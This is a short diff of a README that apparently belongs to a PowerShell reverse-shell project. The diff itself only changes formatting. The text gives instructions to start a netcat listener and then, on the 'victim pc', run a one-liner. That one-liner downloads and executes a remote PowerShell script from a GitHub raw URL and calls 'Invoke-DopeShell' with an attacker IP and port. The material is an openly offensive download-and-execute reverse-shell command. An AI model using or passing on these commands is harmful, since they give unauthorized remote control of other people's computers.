@@ -2,7 +2,7 @@
 
 # INSTRUCTIONS : - 
 <br>
-1.) Run [nc -nlvp 'port'] on your terminal to start up a listener.
+1.) Run `[nc -nlvp 'port']` on your terminal to start up a listener.
 <br>
 2.) Open powershell on the victim pc and type <br> 
 IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/test.ps1' -UseBasicParsing) | Invoke-DopeShell "IP" "PORT" 
